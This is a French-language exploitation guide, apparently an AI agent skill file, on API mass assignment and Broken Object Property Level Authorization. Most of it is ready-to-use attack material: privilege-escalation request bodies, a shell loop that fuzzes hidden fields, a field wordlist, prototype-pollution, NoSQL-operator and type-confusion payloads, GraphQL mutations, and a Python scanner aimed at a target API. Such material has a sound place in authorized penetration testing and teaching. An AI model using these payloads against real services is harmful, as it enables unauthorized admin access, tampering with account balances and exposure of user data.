---
name: api-mass-assignment
description: Guide complet d'exploitation de Mass Assignment (API3) et Broken Object Property Level Authorization (BOPLA) — hidden fields, extra properties, prototype pollution, parameter pollution, et contournement de DTO
category: cybersecurite
---

# Mass Assignment & BOPLA — Guide d'Exploitation Avancé

## Introduction

Le **Mass Assignment** (API3-2023) se produit quand une API lie automatiquement les paramètres de la requête aux propriétés internes d'un objet, permettant à l'attaquant de modifier des champs non prévus. Le **BOPLA** (Broken Object Property Level Authorization) est le nouveau nom OWASP.

## 1. Mass Assignment Basique

### 1.1 Extra Properties dans les Requêtes

```bash
# Ajouter des champs non documentés
POST /api/v1/users/signup HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "secret123",
  "isAdmin": true,
  "role": "admin",
  "quota": 999999999,
  "verified": true,
  "emailVerified": true,
  "email": "attacker@target.com",
  "balance": 1000000,
  "credits": 99999,
  "isPremium": true,
  "subscription": "enterprise"
}
```

### 1.2 PUT/PATCH — Modification de Champs

```bash
# Mise à jour de profil avec champs cachés
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "displayName": "New Name",
  "internalNotes": "hacked",          # ← champ interne
  "accountStatus": "active",          # ← champ système
  "passwordHash": "..."               # ← champ critique
}

# PATCH — modification partielle
PATCH /api/v1/users/me
Content-Type: application/json

[
  {"op": "replace", "path": "/role", "value": "admin"},
  {"op": "add", "path": "/permissions", "value": ["*"]}
]
```

## 2. Découverte de Champs Cachés

### 2.1 Analyse des Réponses API

```bash
# Comparer les réponses pour trouver des champs
# Compte utilisateur normal
curl -s https://api.target.com/api/v1/users/me | jq 'keys'

# Compte admin
curl -s https://api.target.com/api/v1/users/1 \
  -H "Authorization: Bearer <admin_token>" | jq 'keys'

# Chercher les champs sensibles
curl -s https://api.target.com/api/v1/users/me | jq '. | with_entries(select(.key | test("admin|role|perm|flag|secret|internal|is_")))'
```

### 2.2 Fuzzing de Champs

```bash
# Fuzzing des noms de propriétés
for field in isAdmin role permission quota credits verified \
             isPremium isVerified emailVerified accountType \
             userType accessLevel subscription plan tier \
             isStaff isSuperuser isActive isDeleted canDelete \
             canEdit canManage isOwner isModerator; do
  curl -X PATCH https://api.target.com/api/v1/users/me \
    -H "Content-Type: application/json" \
    -d "{\"$field\": true}"
  echo "---"
done
```

### 2.3 Wordlist Spécifique

```bash
# Générer une wordlist de champs potentiels
cat << 'EOF' > fields.txt
isAdmin
is_admin
isadmin
admin
role
roles
permission
permissions
accessLevel
access_level
userType
user_type
accountType
account_type
plan
tier
subscription
isPremium
is_premium
isVerified
is_verified
emailVerified
email_verified
quota
credits
balance
points
score
isActive
is_active
isBanned
isDeleted
isStaff
is_superuser
isSuperuser
isModerator
isOwner
isContributor
canDelete
canEdit
canManage
is_enterprise
isPro
is_pro
isInternal
is_internal
isSystem
is_system
isHidden
is_hidden
isArchived
is_archived
isFrozen
is_frozen
isLocked
is_locked
approved
rejected
status
state
validationStatus
verificationStatus
onboardingComplete
isOnboarded
hasCompletedTutorial
hasAcceptedTerms
termsAccepted
privacyAccepted
marketingConsent
dataConsent
featureFlags
features
toggles
experiments
abTestGroup
referralCode
referredBy
commission
commissionRate
discountCode
discountPercent
vatExempt
taxExempt
taxRate
currency
locale
timezone
EOF
```

## 3. Content-Type Switching

### 3.1 XML → JSON → Form → YAML

```bash
# XML — peut exposer des propriétés non exposées en JSON
POST /api/v1/users/signup
Content-Type: application/xml

<user>
  <username>attacker</username>
  <password>secret</password>
  <isAdmin type="boolean">true</isAdmin>
  <role>admin</role>
</user>

# Form URL-encoded — si l'API accepte
POST /api/v1/users/signup
Content-Type: application/x-www-form-urlencoded

username=attacker&password=secret&isAdmin=true&role=admin

# YAML — si accepté
POST /api/v1/users/signup
Content-Type: application/x-yaml

username: attacker
password: secret
isAdmin: true
role: admin
```

### 3.2 Nested Object Injection

```json
// Flat field
{"password": "newpass"}

// Nested object
{"password": {"$ne": ""}}

// Array injection
{"roles": ["admin", "user"]}
{"roles": "admin"}
{"roles": ["admin"]}

// Object injection
{"settings": {"theme": "dark", "adminOverride": true}}
```

## 4. Prototype Pollution via API

### 4.1 JSON Constructor Injection

```json
POST /api/v1/users/signup
Content-Type: application/json

{
  "username": "attacker",
  "__proto__": {
    "isAdmin": true,
    "admin": true
  }
}
```

### 4.2 Constructor Bypass

```json
// constructor
POST /api/v1/users/signup
{"constructor": {"prototype": {"isAdmin": true}}}

// __proto__ avec nested
POST /api/v1/users/signup
{"__proto__": {"admin": true, "isAdmin": true}}

// JSON.parse — si serveur utilise JSON.parse manuellement
POST /api/v1/users/signup
{"__proto__": {"admin": true}}

// via query params
GET /api/v1/users?__proto__[admin]=true
```

## 5. Array/Object Injection

### 5.1 Array-based Injection

```bash
# Single value → array
POST /api/v1/users/signup
{"roles": "admin"}  # mode string
{"roles": ["admin"]}  # mode array
{"roles": ["admin", "user", "moderator"]}  # multiple

# Range injection
{"userIds": [1,2,3,4,5,6,7,8,9,10]}  # accès à tous les users
```

### 5.2 Object ID Manipulation

```bash
# Changer le type de la valeur
POST /api/v1/users/update
{"id": "me"}  # string
{"id": 1}     # int
{"id": "1"}   # string
{"id": null}  # null → select all
{"id": ["1","2","3"]}  # array → batch update
```

## 6. BOPLA — Hidden Property Exploitation

### 6.1 Response Property Inspection

```bash
# Réponse API avec champs conditionnels
# Si ?fields= ou ?select= ou ?include= est supporté
curl -s "https://api.target.com/api/v1/users/me?fields=id,email,password,isAdmin,role,ssn,creditCard"
curl -s "https://api.target.com/api/v1/users/me?fields=id,email,passwordHash,internalNotes,accountStatus"
curl -s "https://api.target.com/api/v1/users/me?select=id,email,isAdmin,role,permissions"

# GraphQL — query spécifique
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ me { id email isAdmin role passwordHash internalNotes } }"}'
```

### 6.2 Property Type Confusion

```bash
# Changer le type pour contourner la validation
POST /api/v1/users/update
{"isAdmin": "true"}       # string → coercion
{"isAdmin": 1}            # int → truthy
{"isAdmin": "yes"}        # string → truthy
{"isAdmin": [true]}       # array → truthy
{"isAdmin": {"$gt": 0}}   # NoSQL operator
{"isAdmin": {"_type": "boolean", "_value": true}}  # MongoDB
```

## 7. Greedy / DTO Bypass

### 7.1 Mass Assignment via Nested Objects

```json
// Nested object avec profondeur
POST /api/v1/orders
{
  "product": "laptop",
  "quantity": 1,
  "user": {
    "id": 1,
    "isAdmin": true,
    "discountRate": 100
  }
}
```

### 7.2 PUT vs POST — All Fields

```bash
# PUT remplace TOUT l'objet (pas de DTO)
# Si le DTO n'est appliqué que sur POST, PUT peut bypasser
PUT /api/v1/users/1
Content-Type: application/json

{
  "username": "admin",
  "password": "newpass",
  "isAdmin": true,
  "role": "superadmin",
  "quota": 999999,
  "email": "admin@hacked.com"
}
```

## 8. GraphQL Mutation Bypass

```graphql
# Mutation avec champs supplémentaires
mutation {
  updateUser(
    input: {
      id: 1
      name: "hacker"
      isAdmin: true        # champ non documenté
      role: "superadmin"
      __proto__: { admin: true }  # pollution
    }
  ) {
    id
    name
    role
  }
}
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Scanner de Mass Assignment automatisé."""
import requests
import json

BASE = "https://api.target.com"
TOKEN = "Bearer <token>"

# Champs à tester
SENSITIVE_FIELDS = [
    "isAdmin", "role", "roles", "permission", "permissions",
    "quota", "credits", "balance", "isVerified", "emailVerified",
    "isPremium", "subscription", "plan", "tier", "accessLevel",
    "isStaff", "isSuperuser", "isModerator", "isOwner"
]

def test_mass_assignment(endpoint, method="POST"):
    """Teste l'assignation de champs sensibles."""
    for field in SENSITIVE_FIELDS:
        payload = {"username": "test", "password": "test123", field: True}
        if method == "POST":
            r = requests.post(BASE + endpoint, json=payload,
                            headers={"Authorization": TOKEN})
        elif method == "PATCH":
            r = requests.patch(BASE + endpoint, json=payload,
                             headers={"Authorization": TOKEN})
        if r.status_code in [200, 201, 204]:
            data = r.json() if r.text else {}
            # Vérifier si le champ a été accepté
            if field in data or field in str(r.text):
                print(f"[MASS ASSIGN] {field} accepté sur {endpoint}")
    print("[*] Scan terminé")

if __name__ == "__main__":
    test_mass_assignment("/api/v1/users/signup")
    test_mass_assignment("/api/v1/users/me", "PATCH")
```

## Checklist

- [ ] Extra properties dans POST/PUT/PATCH
- [ ] Champs de type boolean (isAdmin, isVerified)
- [ ] Champs de type rôle/permission
- [ ] Champs de type quota/limite
- [ ] Content-Type switching (JSON/XML/Form/YAML)
- [ ] Nested object injection
- [ ] Array injection (roles: ["admin"])
- [ ] Prototype pollution (__proto__)
- [ ] Constructor injection
- [ ] PATCH JSON Patch (op replace path)
- [ ] PUT vs POST — DTO bypass
- [ ] GraphQL mutation avec champs extra
- [ ] Response fields enumeration (fields=, select=, include=)
- [ ] Type confusion (int/string/bool/array/null)
- [ ] NoSQL operators ($ne, $gt)
- [ ] Hidden properties dans les réponses

## Ressources

- **OWASP API3: Broken Object Property Level Authorization** : https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
- **HackTricks Mass Assignment** : https://book.hacktricks.wiki/en/pentesting-web/mass-assignment/index.html
- **PayloadsAllTheThings Mass Assignment** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
- **PortSwigger Mass Assignment** : https://portswigger.net/web-security/api-mass-assignment